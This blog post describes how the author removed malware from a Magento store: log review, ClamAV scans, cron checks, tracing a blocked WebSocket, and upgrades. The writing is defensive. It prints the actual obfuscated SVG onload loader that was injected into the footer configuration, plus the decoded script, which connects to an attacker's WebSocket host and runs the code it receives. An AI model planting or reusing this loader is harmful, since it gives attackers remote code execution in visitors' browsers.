---
layout: post
title: Magento has virus, how I got rid of it
date: 2024-09-03 22:25 +0200
image:
  path: /assets/img/posts/2024-09-03-magento-virus-how-i-got-rid-of-it/img001.webp
  alt: A computer in the dark lighting red from the monitor
categories: [Security, Malware]
tags: [magento, security, malware]
---
One day I received a call from a friend who informed me their system had been infected by a virus and they were asking for help getting rid of it, I immediately said that I would help thinking it would be an easy fix, However, I quickly realized I was wrong.

## Keep the world away!!

The first thing I did was isolate the site from the outside world and made it possible only to access it from my computer by whitelisting only my IP, which allowed me to continue working with the site remotely.

When a system is affected by a virus, it is crucial to isolate it from the outside world to prevent the virus from spreading, by, if possible, disconnect it from the network entirely by removing the network cable. However, this wasn't possible because I was miles away, so I had to do what I could remotely.

## Mr. Virus, where are you hiding?

Now that I had isolated the virus it was time to find the bugger, I started with looking into all the logs I could think of to see if there would be any indications of where the virus could be located and also to see if there was any indications that any data had left the server and I could not see any logs of this, either it was sophisticated enough to remove all log entries it generated or it was never able to set up any connection outside of the server, hopefully the latter but we can never be sure and should always take responsibility and inform the users of an potential data leak.

After thoroughly reviewing the logs, I concluded that they would not reveal to me the path to the virus so I moved on and ran a service called ClamAV (clamscan) to see if it could find any suspicious files.
 
```bash
sudo clamscan -r / --infected --remove
```

and success it could find 2 files, defunct and defunct.dat which I removed, in the same folder I could find a log file telling me it had tried to setup a cronjob but had failed doing so, I removed this file also, unfortunately before I documented the content of the file, so even that I want to show what the content I can't.

Once the files were removed I ran the service again to make sure the files was really removed and not other infected files could be found.

## Was there any cron jobs?

So the log file I found had exposed that it tried to create a cron job so I of course had to make sure it actually didn’t manage to do so and that the logs wasn't lying to me so I went through all cron jobs for each user, wanted to be sure nothing was hidden so I checked in multiple ways:

```bash
$ crontab -l
$ sudo crontab -l
$ sudo -u www-data crontab -l
$ sudo cat /etc/crontab
$ sudo ls /etc/cron.*
```

No mather how I checked I could not find any njob that looked weird, so made the conclusion that it was actually never able to create any cronjobs.

Even if a log says something or even worse, says nothing you should always expect the worst because the logs might be trying to throw you off, so it's better to be safe than sorry. 

## So was that it?

Now with the infected files gone you might think it was safe to open up the server to the world again, but not so fast!

The infected files might have been removed but there can still be danger around the corner so what I did was to set up a proxy so only I could access the site from my computer and could see that the site tried to create a WebSocket connection, but that connection was blocked by CSP (Content Security Policy), so instead I got a console error that looked like this:

```
Content-Security-Policy: (Report-Only policy)
The page’s settings would block the loading of a resource (connect-src)
at wss://fallodick87-78.sbs/common…
```

I looked into what the dev tool in the browser was saying about the script that was trying to be run and could find the following:

```javascript
(function anonymous() {
  const ogt = [
    93, 89, 89, 16, 5, 5, 76, 75, 70, 70, 69, 78, 67, 73, 65, 18, 29, 7, 29,
    18, 4, 89, 72, 89, 5, 73, 69, 71, 71, 69, 68, 21, 89, 69, 95, 88, 73, 79,
    23
  ];
  hky = 42;
  const xvk = String.fromCharCode(...ogt.map(airu => airu ^ hky));
  window.ww = new WebSocket(xvk + encodeURIComponent(location.href));
  window.ww.addEventListener('message', event => {
    new Function(event.data)();
  });
})
```

So as I was afraid, that there was still something wrong that needed to be investigated, so I started to search the webbserver for keywords from the script that the browser had shown me, I knew that variable names and function names get’s randomly generated for security reasons in the browser so I focused on other keywords like “WebSocket”, “addEventListener”, “encodeURIComponent” and so on but no luck.. I concluded that the problem was not on the web server side, then where can it be?

The only other part of the system I knew that could store these kind of data is the database so I created a dump of the entire databas so I could easily search though it and started to search for different keywords but again no luck, I was really confused and lost now and it was in the middle of the night so lack of sleep was also fighting against me here and might be the reason why I missed two things that would had made my find this earlier but more about that later.

I keep’t digging for clues on both the webbserver side and in the database but still no luck, finally I opened up the site in Chrome to see if I got another error there and what happen was that Chrome did something that Firefox didn’t and that was to point out the location of where the infected script was in the DOM and there I could see that it was a svg tag that was generating the infected script so went back to the database and went through all entries with an svg in it and finally found it!!

```sql
(
    XXXX,
    'default',
    0,
    'design/footer/absolute_footer',
    '\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r
    \n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<svg width=\"1px\"
     height=\"1px\" onload=\"!function(aa,t){!function(aa){var n=function(aa,t)
     {return aa.split(\'\').map(function(aa,n){return String.fromCharCode(aa.
     charCodeAt(0)^t.charCodeAt(n%t.length))}).join(\'\')}(aa.split(\'\')
     .reverse().join(\'\'),t);new Function(n)()}(aa)}(
     \'\\x5c\\x48\\x09\\x5c\\x4e\\x49\\x5d\\x06\\x13\\x00\\x10\\x49\\x13\\x0f
     \\x11\\x11\\x02\\x49\\x1a\\x08\\x0e\\x15\\x17\\x09\\x12\\x27\\x54\\x10\\x02
     \\x0f\\x0f\\x47\\x59\\x5c\\x54\\x13\\x09\\x04\\x02\\x02\\x47\\x4d\\x53\\x02
     \\x00\\x00\\x07\\x14\\x02\\x0c\\x53\\x4f\\x15\\x04\\x1a\\x02\\x13\\x12\\x1d
     \\x2b\\x13\\x0f\\x11\\x11\\x22\\x05\\x10\\x06\\x49\\x16\\x03\\x49\\x10\\x0e
     \\x10\\x09\\x0e\\x16\\x4f\\x4e\\x4e\\x07\\x11\\x15\\x0f\\x4f\\x1a\\x08\\x0e
     \\x15\\x15\\x04\\x08\\x0d\\x5c\\x13\\x09\\x04\\x1a\\x08\\x17\\x0c\\x1b\\x24
     \\x2e\\x33\\x21\\x02\\x03\\x0e\\x17\\x09\\x02\\x41\\x5f\\x47\\x0c\\x17\\x0c
     \\x4f\\x13\\x04\\x1f\\x04\\x08\\x32\\x16\\x02\\x30\\x41\\x03\\x02\\x09\\x41
     \\x49\\x47\\x10\\x16\\x5a\\x10\\x08\\x05\\x1a\\x0e\\x10\\x5a\\x5d\\x4e\\x1e
     \\x0a\\x1c\\x47\\x39\\x41\\x01\\x15\\x0e\\x00\\x54\\x59\\x5a\\x41\\x01\\x15
     \\x0e\\x00\\x5c\\x17\\x06\\x0c\\x5a\\x13\\x00\\x0e\\x5a\\x49\\x49\\x49\\x11
     \\x03\\x08\\x22\\x06\\x06\\x0f\\x22\\x19\\x08\\x15\\x07\\x5a\\x00\\x09\\x08
     \\x06\\x13\\x34\\x41\\x49\\x47\\x0c\\x17\\x0c\\x47\\x13\\x12\\x1a\\x08\\x04
     \\x5a\\x46\\x53\\x47\\x5c\\x54\\x1e\\x0c\\x09\\x4f\\x3a\\x54\\x53\\x58\\x5e
     \\x50\\x4d\\x47\\x50\\x4b\\x59\\x4c\\x4b\\x52\\x58\\x58\\x5e\\x51\\x4d\\x4d
     \\x5f\\x4b\\x50\\x46\\x4b\\x5f\\x57\\x58\\x5e\\x51\\x4d\\x45\\x50\\x4b\\x50
     \\x43\\x4b\\x5e\\x57\\x58\\x54\\x50\\x4d\\x41\\x4b\\x5e\\x59\\x58\\x55\\x50
     \\x4d\\x4d\\x5f\\x4b\\x55\\x58\\x5f\\x56\\x4d\\x4d\\x55\\x4b\\x56\\x58\\x5e
     \\x55\\x4d\\x4c\\x56\\x4b\\x54\\x42\\x4b\\x54\\x56\\x58\\x50\\x51\\x4d\\x4c
     \\x50\\x4b\\x58\\x42\\x4b\\x57\\x56\\x58\\x57\\x50\\x4d\\x41\\x50\\x4b\\x57
     \\x43\\x4b\\x52\\x4d\\x41\\x4b\\x51\\x50\\x58\\x5e\\x5f\\x4d\\x4d\\x5f\\x4b
     \\x52\\x4d\\x3c\\x47\\x5c\\x54\\x13\\x00\\x0e\\x54\\x13\\x14\\x0f\\x1b\\x04\', 
     \'gtag\');\"></svg>',
    'YYYY-mm-dd HH:ii:ss'
  )
```

Removing the infected script and took a part of the script and made another search of the dump I could find another place that had the same script so I removed that as well, and with all the infected scripts removed I went back to my browser and could confirm that no more WebSockets was trying to be created so I called that an success!

## I did some mistakes..

So after this success, I summarized the process and realized that I had made two mistakes that could have saved me some time:

1. When I used Firefox I could have asked it to show me where in the DOM the script was, but I was to focused on what the dev tool said about the script that was trying to be executed that I never thought about looking in the DOM at all, a lesson learned!
2. Even though I tried multiple words from the script, I couldn't find them because they were encoded and then decoded in the browser. However, there was one word I missed that would have pointed me directly to the source without having to look into the DOM: 'fromCharCode', this existed both in the generated script and in the database.

Even though I made these mistakes that made the process longer I am happy I made them because when you make mistakes you learn so if this happens again or I have to search for similar things I will have in my memory to both check all keywords and also check the DOM.

## Time to open up the site to the world and go to bed!

Not really, the virus was now confirmed gone but somehow it had been allowed access into the system, so we had a hole somewhere, so what I wanted to do was to upgrade the site:

```bash
# Upgrade Magento composer packages
$ composer remove magento/product-community-edition --no-update
$ composer require-commerce magento/product-community-edition 2.4.7-p2 --no-update
$ composer update magento/product-community-edition

# Upgrade Magento installation 
$ php bin/nagento setup:upgrade
$ php bin/magento setup:di:compile
$ php bin/magento setup:static-content:deploy -f
$ php bin/magento c:c
$ php bin/magento c:f
```

... the rest the composer packages:

```bash
$ composer update
```

... and also the Linux packages:

```bash
$ sudo apt update && sudo apt upgrade -y
```

I did this to make sure the system are running on the latest version to help mitigate that it would happen again, so I spent another hour or two making sure everything was up to date.
Usually I would have done this in a development environment first but because the site is being used every day I wanted to speed up the process and do it immediately in production and this was okay by the owner (my friend), but as a general rule, always do the upgrade first in a test or dev environment to make sure nothing crashes before upgrading your production environment.

## Finally time to go live

Once everything was up-to-date, I reopened the site to the world and informed the owner that everything is back in business and requested that they inform their users about the breach so they can make the necessary actions.

My final advice is to ensure your systems have good logs, are monitored, and up-to-date and has all the necessary security features enabled to prevent this to happen to you, you can never protect yourself entirely from a virus or a hacker but you can make it hard for them and let them work for it.
